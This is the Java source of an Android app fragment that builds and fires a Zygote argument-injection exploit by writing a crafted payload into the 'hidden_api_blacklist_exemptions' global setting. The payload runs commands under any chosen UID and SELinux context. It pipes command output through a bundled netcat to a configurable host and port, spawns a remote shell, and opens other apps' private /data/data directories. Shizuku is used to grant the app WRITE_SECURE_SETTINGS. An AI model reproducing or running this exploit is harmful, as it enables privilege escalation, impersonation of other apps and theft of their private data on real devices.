package com.wqry085.deployesystem;

import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.widget.EditText;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AlertDialog;
import androidx.preference.EditTextPreference;
import androidx.preference.ListPreference;
import androidx.preference.MultiSelectListPreference;
import androidx.preference.Preference;
import androidx.preference.PreferenceCategory;
import androidx.preference.PreferenceFragmentCompat;
import androidx.preference.PreferenceManager;

import com.google.android.material.dialog.MaterialAlertDialogBuilder;
import com.google.android.material.snackbar.Snackbar;
import com.google.android.material.textfield.TextInputLayout;
import com.wqry085.deployesystem.sockey.ZygoteControlClient;
import com.wqry085.deployesystem.sockey.ZygoteControlListener;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import rikka.shizuku.Shizuku;


public class ZygoteFragment extends PreferenceFragmentCompat
        implements Preference.OnPreferenceChangeListener,
        Preference.OnPreferenceClickListener {

    private static final String TAG = "ZygoteFragment";

    
    private static final String KEY_STATUS = "runtime_status";
    private static final String KEY_LOGS = "log_output";
    private static final String KEY_COMMAND_INPUT = "command_input";
    private static final String KEY_IP = "ip_address";
    private static final String KEY_PORT = "server_port";
    private static final String KEY_START = "start_server";
    private static final String KEY_STOP = "stop_server";
    private static final String KEY_EXEC = "execute_btn";
    private static final String KEY_TERMINAL = "terminal";
    private static final String KEY_TOP_DATA = "top_data";
    private static final String KEY_ADVANCED_CATEGORY = "advanced_category";
    private static final String KEY_ADVANCED_TRIGGER = "advanced_trigger";
    private static final String KEY_SHELL_TERMINAL = "shell_terminal";
    private static final String KEY_ANDROID12_INFO = "1312";
    private static final String KEY_APP_SELECTOR = "app_selector";
    private static final String KEY_MULTI_SELECT = "multi_select_preference";

    
    private static final String DEFAULT_IP = "0.0.0.0";
    private static final int DEFAULT_PORT = 9981;
    private static final int DEFAULT_ZYG1 = 5;
    private static final int DEFAULT_ZYG2 = 0;
    private static final int DEFAULT_ZYG3 = 4;
    private static final String INITIAL_LOG_TEXT = "No logs";

    
    private static final String EASTER_EGG_LOWER = "hello dream";
    private static final String EASTER_EGG_UPPER = "HELLO DREAM";

    
    private EditTextPreference commandInputPref;
    private EditTextPreference ipAddressPref;
    private EditTextPreference portPref;
    private EditTextPreference setuidInputPref;
    private EditTextPreference setgidInputPref;
    private EditTextPreference setgroupInputPref;
    private EditTextPreference selinuxInputPref;
    private EditTextPreference niceNameInputPref;
    private EditTextPreference zyg1Pref;
    private EditTextPreference zyg2Pref;
    private EditTextPreference zyg3Pref;
    private ListPreference runtimeFlagsListPref;
    private PreferenceCategory advancedCategory;
    private Preference advancedTrigger;

    
    private ExecutorService executor;
    private ServerThread serverThread;
    private final Handler handler = new Handler(Looper.getMainLooper());
    private boolean isAdvancedExpanded = false;
    private boolean isFirstLog = true;
    private volatile String lastReceivedMessage;

    
    private enum ValueType {
        DIGITS,     
        NON_SPACE   
    }

    

    @Override
    public void onCreatePreferences(Bundle savedInstanceState, String rootKey) {
        setPreferencesFromResource(R.xml.root_preference, rootKey);
        initPreferences();
    }

    @Override
    public void onDestroy() {
        
        handler.removeCallbacksAndMessages(null);
        stopServer();
        shutdownExecutor();
        super.onDestroy();
    }

    

    private void initPreferences() {
        disableMiuiOptimization();
        executor = Executors.newSingleThreadExecutor();

        initDefaultValues();
        bindPreferences();
        setupListeners();
        setupVisibility();
    }

    private void initDefaultValues() {
        SharedPreferences prefs = getPreferenceManager().getSharedPreferences();
        if (prefs == null) return;

        SharedPreferences.Editor editor = prefs.edit();
        if (!prefs.contains(KEY_IP)) {
            editor.putString(KEY_IP, DEFAULT_IP);
        }
        if (!prefs.contains(KEY_PORT)) {
            editor.putString(KEY_PORT, String.valueOf(DEFAULT_PORT));
        }
        editor.apply();

        setPreferenceSummary(KEY_LOGS, getString(R.string.zygote_fragment_no_logs));
    }

    private void bindPreferences() {
        commandInputPref = findPreference(KEY_COMMAND_INPUT);
        ipAddressPref = findPreference(KEY_IP);
        portPref = findPreference(KEY_PORT);
        setuidInputPref = findPreference("setuid_input");
        setgidInputPref = findPreference("setgid_input");
        setgroupInputPref = findPreference("setgroup_input");
        selinuxInputPref = findPreference("setselinux_input");
        niceNameInputPref = findPreference("nice_name_input");
        runtimeFlagsListPref = findPreference("runtime_flags_list");
        zyg1Pref = findPreference("zyg1");
        zyg2Pref = findPreference("zyg2");
        zyg3Pref = findPreference("zyg3");
        advancedCategory = findPreference(KEY_ADVANCED_CATEGORY);
        advancedTrigger = findPreference(KEY_ADVANCED_TRIGGER);
    }

    private void setupListeners() {
        setPreferenceChangeListener(KEY_IP, this);
        setPreferenceChangeListener(KEY_PORT, this);
        
        setPreferenceClickListener(KEY_START, this);
        setPreferenceClickListener(KEY_STOP, this);
        setPreferenceClickListener(KEY_EXEC, this);
        setPreferenceClickListener(KEY_TERMINAL, this);
        setPreferenceClickListener(KEY_TOP_DATA, this);
        setPreferenceClickListener(KEY_APP_SELECTOR, this);

        
        if (advancedTrigger != null) {
            advancedTrigger.setOnPreferenceClickListener(pref -> {
                toggleAdvancedSettings();
                return true;
            });
        }

        
        Preference shellPref = findPreference(KEY_SHELL_TERMINAL);
        if (shellPref != null) {
            shellPref.setOnPreferenceClickListener(pref -> {
                handleShellTerminalClick();
                return true;
            });
        }

        
        Preference android12Info = findPreference(KEY_ANDROID12_INFO);
        if (android12Info != null) {
            android12Info.setOnPreferenceClickListener(pref -> {
                MaterialDialogHelper.showSimpleDialog(getActivity(), 
                    getString(R.string.warning), 
                    getString(R.string.android12_warn));
                return true;
            });
        }

        
        MultiSelectListPreference multiSelectPref = findPreference(KEY_MULTI_SELECT);
        if (multiSelectPref != null) {
            multiSelectPref.setOnPreferenceChangeListener((pref, newValue) -> true);
        }
    }

    private void setupVisibility() {
        boolean isAndroid12Plus = Build.VERSION.SDK_INT > Build.VERSION_CODES.R;

        setPreferenceVisible(KEY_ANDROID12_INFO, isAndroid12Plus);
        setPreferenceVisible("zyg1", isAndroid12Plus);
        setPreferenceVisible("zyg2", isAndroid12Plus);
        setPreferenceVisible("zyg3", isAndroid12Plus);

        if (advancedCategory != null) {
            advancedCategory.setVisible(false);
        }

        setPreferenceEnabled(KEY_STOP, false);
    }

    

    @Override
    public boolean onPreferenceChange(@NonNull Preference preference, Object newValue) {
        String key = preference.getKey();

        if (KEY_IP.equals(key)) {
            return handleIpChange((String) newValue);
        } else if (KEY_PORT.equals(key)) {
            return handlePortChange((String) newValue);
        }
        return false;
    }

    @Override
    public boolean onPreferenceClick(@NonNull Preference preference) {
        String key = preference.getKey();

        switch (key) {
            case KEY_START:
                startServer();
                return true;
            case KEY_STOP:
                stopServer();
                return true;
            case KEY_EXEC:
                handleExecuteClick();
                return true;
            case KEY_TERMINAL:
                openTerminalActivity();
                return true;
            case KEY_TOP_DATA:
                handleTopDataClick();
                return true;
            case KEY_APP_SELECTOR:
                showAppSelectorBottomSheet();
                return true;
            default:
                return false;
        }
    }

    

    private boolean handleIpChange(String ip) {
        if (!isValidIp(ip)) {
            showToast(getString(R.string.invalid_ip));
            return false;
        }
        appendLog(String.format(getString(R.string.ip_updated), ip));
        return true;
    }

    private boolean handlePortChange(String portStr) {
        try {
            int port = Integer.parseInt(portStr);
            if (port < 1024 || port > 65535) {
                showToast(getString(R.string.port_range));
                return false;
            }
            appendLog(String.format(getString(R.string.port_updated), port));
            return true;
        } catch (NumberFormatException e) {
            showToast(getString(R.string.invalid_port));
            return false;
        }
    }

    private void handleExecuteClick() {
        String command = getPreferenceText(commandInputPref);

        
        if (EASTER_EGG_LOWER.equalsIgnoreCase(command)) {
            openHelloDreamActivity();
            return;
        }

        
        if (!validateInputs()) {
            return;
        }

        String payload = buildExecutePayload(command);
        if (payload != null) {
            runPayload(payload);
            showSnackbar(getString(R.string.payload_sign));
        }
    }

    private void handleShellTerminalClick() {
        String uidStr = getPreferenceText(setuidInputPref);
        
        MaterialDialogHelper.showConfirmDialog(getActivity(),
            getString(R.string.create_remote),
            String.format(getString(R.string.create_msg), uidStr),
            (dialog, which) -> {
                if (!validateInputs()) return;
                
                String payload = buildShellPayload(uidStr);
                if (payload != null) {
                    runPayload(payload);
                    MaterialDialogHelper.showSimpleDialog(getActivity(),
                        getString(R.string.create_done),
                        getString(R.string.success_hint));
                }
            });
    }

    private void handleTopDataClick() {
        Context context = getActivity();
        if (context == null) return;

        MaterialAlertDialogBuilder builder = new MaterialAlertDialogBuilder(context);
        builder.setTitle(getString(R.string.extract_data));

        View dialogView = LayoutInflater.from(context).inflate(R.layout.appdir, null);
        builder.setView(dialogView);

        TextInputLayout textInputLayout = dialogView.findViewById(R.id.text_input_layout);
        EditText editText = textInputLayout.getEditText();

        builder.setPositiveButton(getString(R.string.run_text), (dialog, which) -> {
            if (editText == null) return;

            String packageName = editText.getText().toString().trim();
            if (packageName.isEmpty()) {
                textInputLayout.setError(getString(R.string.input_empty));
                return;
            }

            if (!isAppInstalled(context, packageName)) {
                showSnackbar(getString(R.string.app_not_found));
                return;
            }

            int uid = getUidByPackageName(context, packageName);
            if (uid == -1) {
                showSnackbar(getString(R.string.app_not_found));
                return;
            }

            String payload = buildAppDataPayload(uid, packageName);
            if (payload != null) {
                runPayload(payload);
                showSnackbar(getString(R.string.payload_injected));
            }
        });

        builder.setNegativeButton(getString(R.string.cancel), (dialog, which) -> dialog.cancel());
        builder.create().show();
    }

    

    
    @Nullable
    private String buildExecutePayload(String command) {
        String sanitizedCommand = sanitizeShellCommand(command);
        String basePayload = getBasePayload();
        String ip = getPreferenceText(ipAddressPref);
        String port = getPreferenceText(portPref);
        String nativeLibDir = getNativeLibraryDir();

        if (basePayload == null || nativeLibDir == null) {
            return null;
        }

        if (isAndroid12To13()) {
            return basePayload + 
                "/system/bin/logwrapper echo zYg0te $(" + sanitizedCommand + 
                " | " + nativeLibDir + "/libzygote_nc.so " + ip + " " + port + ")" + 
                getPayloadBuffer();
        } else {
            return basePayload + 
                "echo \"$(" + sanitizedCommand + ")\" | " + 
                nativeLibDir + "/libzygote_nc.so " + ip + " " + port + ";" + 
                getPayloadBuffer();
        }
    }

    
    @Nullable
    private String buildShellPayload(String uidStr) {
        String basePayload = getBasePayload();
        String nativeLibDir = getNativeLibraryDir();

        if (basePayload == null || nativeLibDir == null) {
            return null;
        }

        if (isAndroid12To13()) {
            return basePayload + 
                "/system/bin/logwrapper echo zYg0te $(/system/bin/setsid " + 
                nativeLibDir + "/libzygote_term.so " + uidStr + ")" + 
                getPayloadBuffer();
        } else {
            return basePayload + 
                "echo $(setsid " + nativeLibDir + "/libzygote_term.so " + uidStr + ");" + 
                getPayloadBuffer();
        }
    }

    
    @Nullable
    private String buildAppDataPayload(int uid, String packageName) {
        String basePayload = getBasePayload();
        String nativeLibDir = getNativeLibraryDir();

        if (basePayload == null || nativeLibDir == null) {
            return null;
        }

        String appDir = "/data/data/" + sanitizePackageName(packageName) + ":56423";

        if (isAndroid12To13()) {
            return basePayload + 
                "/system/bin/logwrapper echo zYg0te $(/system/bin/setsid " + 
                nativeLibDir + "/libzygote_term.so " + uid + " --app-dir=" + appDir + ")" + 
                getPayloadBuffer();
        } else {
            return basePayload + 
                "echo $(setsid " + nativeLibDir + "/libzygote_term.so " + uid + 
                " --app-dir=" + appDir + ");" + 
                getPayloadBuffer();
        }
    }

    
    @Nullable
    private String getBasePayload() {
        try {
            String rawPayload = generateRawPayload();
            
            String uid = getPreferenceText(setuidInputPref);
            String gid = getPreferenceText(setgidInputPref);
            String selinux = getPreferenceText(selinuxInputPref);
            String niceName = getPreferenceText(niceNameInputPref);
            String runtimeFlags = runtimeFlagsListPref != null ? 
                runtimeFlagsListPref.getValue() : "0";

            return replaceAllParameters(rawPayload, uid, gid, selinux, niceName, runtimeFlags);
        } catch (Exception e) {
            Log.e(TAG, "Failed to get base payload", e);
            showErrorDialog("Payload Generation Failed", e.getMessage());
            return null;
        }
    }

    
    private String generateRawPayload() {
        int zyg1Count = DEFAULT_ZYG1;
        int zyg2Count = DEFAULT_ZYG2;

        if (Build.VERSION.SDK_INT > Build.VERSION_CODES.R) {
            zyg1Count = safeParseInt(zyg1Pref, DEFAULT_ZYG1);
            zyg2Count = safeParseInt(zyg2Pref, DEFAULT_ZYG2);
        }

        StringBuilder payload = new StringBuilder();

        
        for (int i = 0; i < zyg1Count; i++) {
            payload.append("\n");
        }

        
        char[] padding = new char[zyg2Count];
        Arrays.fill(padding, 'A');
        payload.append(padding);

        
        String niceName = getPreferenceText(niceNameInputPref);
        String runtimeFlags = runtimeFlagsListPref != null ? 
            runtimeFlagsListPref.getValue() : "0";

        payload.append(ZygoteArguments.CALCULATE)
               .append(ZygoteArguments.SET_UID)
               .append(ZygoteArguments.SET_GID)
               .append(ZygoteArguments.ARGS)
               .append(ZygoteArguments.SEINFN)
               .append(ZygoteArguments.RUNTIME_FLAGS).append(runtimeFlags).append("\n")
               .append(ZygoteArguments.PROC_NAME).append(niceName).append("\n")
               .append(ZygoteArguments.EXEC_WITH);

        String result = payload.toString();

        
        Context context = getActivity();
        if (context != null) {
            String[] extraParams = getMultiSelectedTexts(context, KEY_MULTI_SELECT);
            result = insertParamsAfter(result, "--runtime-args", extraParams);

            
            String groups = getPreferenceText(setgroupInputPref);
            if (!groups.isEmpty()) {
                String[] groupParam = {"--setgroups=" + sanitizeNumericList(groups)};
                result = insertParamsAfter(result, "--setgid=", groupParam);
            }
        }

        return result;
    }

    
    private String getPayloadBuffer() {
        int count = DEFAULT_ZYG3;
        if (Build.VERSION.SDK_INT > Build.VERSION_CODES.R) {
            count = safeParseInt(zyg3Pref, DEFAULT_ZYG3);
        }

        char[] commas = new char[count];
        Arrays.fill(commas, ',');
        return " #" + new String(commas) + "X";
    }

    

    
    public static String replaceAllParameters(String originalText, 
                                               String newUid, 
                                               String newGid,
                                               String newSelinux, 
                                               String newNiceName, 
                                               String newRuntimeFlags) {
        if (originalText == null) {
            return null;
        }

        String result = originalText;

        if (newUid != null && !newUid.isEmpty()) {
            result = replaceParameter(result, "--setuid=", newUid, ValueType.DIGITS);
        }

        if (newGid != null && !newGid.isEmpty()) {
            result = replaceParameter(result, "--setgid=", newGid, ValueType.DIGITS);
        }

        
        if (newSelinux != null && !newSelinux.isEmpty()) {
            result = replaceParameter(result, "--seinfo=", newSelinux, ValueType.NON_SPACE);
        }

        if (newNiceName != null && !newNiceName.isEmpty()) {
            result = replaceParameter(result, "--nice-name=", newNiceName, ValueType.NON_SPACE);
        }

        if (newRuntimeFlags != null && !newRuntimeFlags.isEmpty()) {
            result = replaceParameter(result, "--runtime-flags=", newRuntimeFlags, ValueType.DIGITS);
        }

        return result;
    }

    
    private static String replaceParameter(String text, String paramName, 
                                           String newValue, ValueType type) {
        StringBuilder result = new StringBuilder();
        int lastIndex = 0;
        int paramLen = paramName.length();

        while (true) {
            int paramIndex = findExactParameter(text, paramName, lastIndex);
            if (paramIndex == -1) {
                result.append(text, lastIndex, text.length());
                break;
            }

            result.append(text, lastIndex, paramIndex + paramLen);

            int valueStart = paramIndex + paramLen;
            int valueEnd = findValueEnd(text, valueStart, type);

            result.append(newValue);
            lastIndex = valueEnd;
        }

        return result.toString();
    }

    
    private static int findValueEnd(String text, int start, ValueType type) {
        int end = start;
        while (end < text.length()) {
            char c = text.charAt(end);
            boolean shouldContinue;
            
            switch (type) {
                case DIGITS:
                    shouldContinue = Character.isDigit(c);
                    break;
                case NON_SPACE:
                    shouldContinue = !Character.isWhitespace(c);
                    break;
                default:
                    shouldContinue = false;
            }
            
            if (!shouldContinue) break;
            end++;
        }
        return end;
    }

    
    private static int findExactParameter(String text, String param, int fromIndex) {
        int index = fromIndex;
        while (index < text.length()) {
            int found = text.indexOf(param, index);
            if (found == -1) return -1;

            if (isExactParameterMatch(text, found, param)) {
                return found;
            }
            index = found + 1;
        }
        return -1;
    }

    
    private static boolean isExactParameterMatch(String text, int index, String param) {
        
        if (index > 0) {
            char prev = text.charAt(index - 1);
            if (!Character.isWhitespace(prev)) {
                return false;
            }
        }

        
        return index + param.length() <= text.length() &&
               text.substring(index, index + param.length()).equals(param);
    }

   
public String insertParamsAfter(String originalText, String anchorParam, String[] newParams) {
    if (originalText == null || originalText.isEmpty() ||
        newParams == null || newParams.length == 0) {
        return originalText;
    }

    
    Pattern countPattern = Pattern.compile("(\\d+)");
    Matcher matcher = countPattern.matcher(originalText);

    String updatedText = originalText;
    if (matcher.find()) {
        try {
            int currentCount = Integer.parseInt(matcher.group(1));
            int newCount = currentCount + newParams.length;
            
            
            StringBuilder sb = new StringBuilder(originalText);
            sb.replace(matcher.start(), matcher.end(), String.valueOf(newCount));
            updatedText = sb.toString();
        } catch (NumberFormatException e) {
            Log.w(TAG, "Failed to parse parameter count", e);
        }
    } else {
        Log.w(TAG, "No parameter count found in payload");
    }

    String[] lines = updatedText.split("(?<=\n)", -1);
    StringBuilder result = new StringBuilder();
    boolean inserted = false;
    boolean reachedInvokeWith = false;

    for (String line : lines) {
        result.append(line);

        if (!inserted && !reachedInvokeWith && line.contains(anchorParam)) {
            for (String param : newParams) {
                if (param != null && !param.isEmpty()) {
                    result.append(param).append("\n");
                }
            }
            inserted = true;
        }

        if (line.contains("--invoke-with")) {
            reachedInvokeWith = true;
        }
    }

    if (!inserted) {
        Log.w(TAG, "Anchor parameter not found: " + anchorParam);
    }

    return result.toString();
}
    

    
    private boolean validateInputs() {
        String uid = getPreferenceText(setuidInputPref);
        if (!isValidNumeric(uid)) {
            showToast("Invalid UID: must be a number");
            return false;
        }

        String gid = getPreferenceText(setgidInputPref);
        if (!isValidNumeric(gid)) {
            showToast("Invalid GID: must be a number");
            return false;
        }

        return true;
    }

    
    private boolean isValidNumeric(String value) {
        if (value == null || value.isEmpty()) {
            return false;
        }
        return value.matches("^\\d+$");
    }

    
    private boolean isValidIp(String ip) {
        if (ip == null) return false;
        if ("0.0.0.0".equals(ip)) return true;

        String ipPattern = "^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}" +
                          "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$";
        return ip.matches(ipPattern);
    }

    private String sanitizeShellCommand(String input) {
        if (input == null) return "";
        return input;
    }

    
    private String sanitizePackageName(String packageName) {
        if (packageName == null) return "";
        
        return packageName.replaceAll("[^a-zA-Z0-9._]", "");
    }

    
    private String sanitizeNumericList(String input) {
        if (input == null) return "";
        
        return input.replaceAll("[^0-9,]", "");
    }

    

    private void startServer() {
        if (serverThread == null) {
            serverThread = new ServerThread();
            serverThread.start();
        }
    }

    private void stopServer() {
        if (serverThread != null) {
            serverThread.shutdown();
            serverThread = null;
            updateStatus(getString(R.string.stopped));
            setPreferenceEnabled(KEY_START, true);
            setPreferenceEnabled(KEY_STOP, false);
        }
    }

    private void shutdownExecutor() {
        if (executor != null && !executor.isShutdown()) {
            executor.shutdown();
            try {
                if (!executor.awaitTermination(1, TimeUnit.SECONDS)) {
                    executor.shutdownNow();
                }
            } catch (InterruptedException e) {
                executor.shutdownNow();
                Thread.currentThread().interrupt();
            }
        }
    }

    
    private class ServerThread extends Thread {
        private ServerSocket serverSocket;
        private volatile boolean isRunning = true;

        @Override
        public void run() {
            try {
                int port = getPortFromPreferences();
                serverSocket = new ServerSocket(port);

                handler.post(() -> {
                    appendLog(String.format(getString(R.string.server_started), port));
                    updateStatus(getString(R.string.running));
                    setPreferenceEnabled(KEY_START, false);
                    setPreferenceEnabled(KEY_STOP, true);
                });

                while (isRunning) {
                    try {
                        Socket clientSocket = serverSocket.accept();
                        new ClientHandler(clientSocket).start();
                    } catch (IOException e) {
                        if (isRunning) {
                            Log.e(TAG, "Error accepting client", e);
                        }
                    }
                }
            } catch (IOException e) {
                if (isRunning) {
                    final String errorMsg = e.getMessage();
                    handler.post(() -> appendLog(
                        String.format(getString(R.string.server_error), errorMsg)));
                }
            }
        }

        void shutdown() {
            isRunning = false;
            try {
                if (serverSocket != null && !serverSocket.isClosed()) {
                    serverSocket.close();
                }
                handler.post(() -> appendLog(getString(R.string.server_stopped)));
            } catch (IOException e) {
                final String errorMsg = e.getMessage();
                handler.post(() -> appendLog(
                    String.format(getString(R.string.stop_error), errorMsg)));
            }
        }

        private int getPortFromPreferences() {
            SharedPreferences prefs = getPreferenceManager().getSharedPreferences();
            if (prefs == null) return DEFAULT_PORT;

            try {
                String portStr = prefs.getString(KEY_PORT, String.valueOf(DEFAULT_PORT));
                return Integer.parseInt(portStr);
            } catch (NumberFormatException e) {
                return DEFAULT_PORT;
            }
        }
    }

    
    private class ClientHandler extends Thread {
        private final Socket clientSocket;
        private final String clientIp;

        ClientHandler(Socket socket) {
            this.clientSocket = socket;
            this.clientIp = socket.getInetAddress().getHostAddress();
            handler.post(() -> appendLog(
                String.format(getString(R.string.client_connected), clientIp)));
        }

        @Override
        public void run() {
            try (Socket socket = clientSocket;
                 BufferedReader in = new BufferedReader(
                     new InputStreamReader(socket.getInputStream(), StandardCharsets.UTF_8))) {

                StringBuilder messageBuilder = new StringBuilder();
                String inputLine;
                while ((inputLine = in.readLine()) != null) {
                    messageBuilder.append(inputLine);
                }

                final String message = messageBuilder.toString();
                lastReceivedMessage = message;

                handler.post(() -> appendLog(
                    clientIp + getString(R.string.client_said) + message));

            } catch (IOException e) {
                handler.post(() -> appendLog(
                    clientIp + getString(R.string.client_disconnected)));
            }
        }
    }

    

    
    public void runPayload(String payload) {
        Context context = getActivity();
        if (context == null) {
            Log.e(TAG, "Activity is null, cannot run payload");
            return;
        }

        
        ShizukuExec("pm grant com.wqry085.deployesystem android.permission.WRITE_SECURE_SETTINGS");
        ShizukuExec("am force-stop com.android.settings");

        
        ShizukuExec("echo '" + escapeForShell(payload) + "' > /data/local/tmp/" + 
            getString(R.string.config_file));

        
        ContentValues values = new ContentValues();
        values.put(Settings.Global.NAME, "hidden_api_blacklist_exemptions");
        values.put(Settings.Global.VALUE, payload);

        try {
            context.getContentResolver().insert(
                Uri.parse("content://settings/global"), values);
        } catch (Exception e) {
            Log.e(TAG, "Failed to insert settings", e);
            MaterialDialogHelper.showSimpleDialog(getActivity(),
                getString(R.string.load_fail), e.toString());
            return;
        }

        
        ShizukuExec("am start -n com.android.settings/.Settings");

        
        handler.postDelayed(() -> {
    ContentValues resetValues = new ContentValues();
    resetValues.put(Settings.Global.NAME, "hidden_api_blacklist_exemptions");
    resetValues.put(Settings.Global.VALUE, "null");

    try {
        context.getContentResolver().insert(
            Uri.parse("content://settings/global"), resetValues);  // ✅ 改成 resetValues
    } catch (Exception e) {
        Log.e(TAG, "Failed to reset settings", e);
    }
}, 200);
    }

    
    private String escapeForShell(String input) {
        if (input == null) return "";
        return input.replace("'", "'\\''");
    }

    
    public static String ShizukuExec(String cmd) {
        StringBuilder output = new StringBuilder();
        try {
            Process p = Shizuku.newProcess(new String[]{"sh"}, null, null);
            
            try (OutputStream out = p.getOutputStream()) {
                out.write((cmd + "\nexit\n").getBytes(StandardCharsets.UTF_8));
                out.flush();
            }

            try (BufferedReader reader = new BufferedReader(
                    new InputStreamReader(p.getInputStream(), StandardCharsets.UTF_8))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }
            }

            try (BufferedReader errorReader = new BufferedReader(
                    new InputStreamReader(p.getErrorStream(), StandardCharsets.UTF_8))) {
                String line;
                while ((line = errorReader.readLine()) != null) {
                    output.append(line).append("\n");
                }
            }

            int exitCode = p.waitFor();
            if (exitCode != 0) {
                output.append("Exit code: ").append(exitCode);
            }

            return output.toString();
        } catch (Exception e) {
            Log.e(TAG, "ShizukuExec failed", e);
            return e.toString();
        }
    }

    

    private boolean isAndroid12To13() {
        int sdk = Build.VERSION.SDK_INT;
        return sdk >= Build.VERSION_CODES.S && sdk <= Build.VERSION_CODES.TIRAMISU;
    }

    @Nullable
    private String getNativeLibraryDir() {
        Context context = getActivity();
        if (context == null) return null;
        return context.getApplicationInfo().nativeLibraryDir;
    }

    private String getPreferenceText(@Nullable EditTextPreference pref) {
        if (pref == null || pref.getText() == null) {
            return "";
        }
        return pref.getText().trim();
    }

    private int safeParseInt(@Nullable EditTextPreference pref, int defaultValue) {
        String text = getPreferenceText(pref);
        if (text.isEmpty()) {
            return defaultValue;
        }
        try {
            return Integer.parseInt(text);
        } catch (NumberFormatException e) {
            Log.w(TAG, "Failed to parse int: " + text);
            return defaultValue;
        }
    }

    private void setPreferenceEnabled(String key, boolean enabled) {
        Preference pref = findPreference(key);
        if (pref != null) {
            pref.setEnabled(enabled);
        }
    }

    private void setPreferenceVisible(String key, boolean visible) {
        Preference pref = findPreference(key);
        if (pref != null) {
            pref.setVisible(visible);
        }
    }

    private void setPreferenceSummary(String key, String summary) {
        Preference pref = findPreference(key);
        if (pref != null) {
            pref.setSummary(summary);
        }
    }

    private void setPreferenceChangeListener(String key, Preference.OnPreferenceChangeListener listener) {
        Preference pref = findPreference(key);
        if (pref != null) {
            pref.setOnPreferenceChangeListener(listener);
        }
    }

    private void setPreferenceClickListener(String key, Preference.OnPreferenceClickListener listener) {
        Preference pref = findPreference(key);
        if (pref != null) {
            pref.setOnPreferenceClickListener(listener);
        }
    }

    private void toggleAdvancedSettings() {
        isAdvancedExpanded = !isAdvancedExpanded;
        if (advancedCategory != null) {
            advancedCategory.setVisible(isAdvancedExpanded);
        }
    }

    private void appendLog(String message) {
        Preference logPref = findPreference(KEY_LOGS);
        if (logPref == null) return;

        if (isFirstLog) {
            isFirstLog = false;
        }
        logPref.setSummary(message);
    }

    private void updateStatus(String status) {
        setPreferenceSummary(KEY_STATUS, status);
    }

    private void showToast(String message) {
        Context context = getContext();
        if (context != null) {
            Toast.makeText(context, message, Toast.LENGTH_SHORT).show();
        }
    }

    private void showSnackbar(String message) {
        View view = getView();
        if (view != null) {
            Snackbar.make(view, message, Snackbar.LENGTH_SHORT)
                   .setAction(getString(R.string.ok_text), v -> {})
                   .show();
        }
    }

    private void showErrorDialog(String title, String message) {
        if (getActivity() != null) {
            MaterialDialogHelper.showSimpleDialog(getActivity(), title, message);
        }
    }

    

    public static int getUidByPackageName(Context context, String packageName) {
        if (context == null || packageName == null || packageName.isEmpty()) {
            return -1;
        }

        try {
            ApplicationInfo appInfo = context.getPackageManager()
                .getApplicationInfo(packageName, 0);
            return appInfo.uid;
        } catch (PackageManager.NameNotFoundException e) {
            Log.w(TAG, "Package not found: " + packageName);
            return -1;
        }
    }

    public static boolean isAppInstalled(Context context, String packageName) {
        if (context == null || TextUtils.isEmpty(packageName)) {
            return false;
        }

        try {
            context.getPackageManager().getPackageInfo(packageName, 0);
            return true;
        } catch (PackageManager.NameNotFoundException e) {
            return false;
        }
    }

    public String[] getMultiSelectedTexts(Context context, String preferenceKey) {
        if (context == null) {
            return new String[0];
        }

        SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(context);
        Set<String> selectedValues = prefs.getStringSet(preferenceKey, new HashSet<>());

        if (selectedValues.isEmpty()) {
            return new String[0];
        }

        String[] entryTexts = context.getResources().getStringArray(R.array.multi_select_options);
        String[] entryValues = context.getResources().getStringArray(R.array.multi_select_values);
        List<String> selectedTexts = new ArrayList<>();

        for (String selectedValue : selectedValues) {
            for (int i = 0; i < entryValues.length; i++) {
                if (entryValues[i].equals(selectedValue)) {
                    selectedTexts.add(entryTexts[i]);
                    break;
                }
            }
        }

        return selectedTexts.toArray(new String[0]);
    }

    

    private void disableMiuiOptimization() {
        Context context = getActivity();
        if (context == null) return;

        try {
            String currentValue = Settings.Secure.getString(
                context.getContentResolver(), "miui_optimization");

            if (currentValue == null) {
                return;
            }

            int currentState = Settings.Secure.getInt(
                context.getContentResolver(), "miui_optimization", -1);

            if (currentState == 1) {
                showToast(getString(R.string.close_miui));
                Settings.Secure.putInt(
                    context.getContentResolver(), "miui_optimization", 0);
            }
        } catch (SecurityException e) {
            showToast(String.format(getString(R.string.miui_error), e.getMessage()));
        } catch (Exception e) {
            Log.e(TAG, "Failed to disable MIUI optimization", e);
        }
    }

    

    private void openTerminalActivity() {
        Context context = getActivity();
        if (context != null) {
            Intent intent = new Intent(context, TerminalActivity.class);
            startActivity(intent);
        }
    }

    private void openHelloDreamActivity() {
        Context context = getActivity();
        if (context != null) {
            Intent intent = new Intent(context, hellodream.class);
            startActivity(intent);
            getActivity().finish();
        }
    }

    private void showAppSelectorBottomSheet() {
    AppSelectorBottomSheet bottomSheet = new AppSelectorBottomSheet();
    bottomSheet.setOnAppSelectedListener((packageName, appName) -> {
        
        int uid = getUidByPackageName(requireContext(), packageName);
        
        if (uid == -1) {
            showToast(getString(R.string.app_not_found));
            return;
        }
        
        String uidStr = String.valueOf(uid);
        
        
        if (setuidInputPref != null) {
            setuidInputPref.setText(uidStr);
        }
        if (setgidInputPref != null) {
            setgidInputPref.setText(uidStr);
        }
        
        
    });
    bottomSheet.show(getParentFragmentManager(), "app_selector");
}
}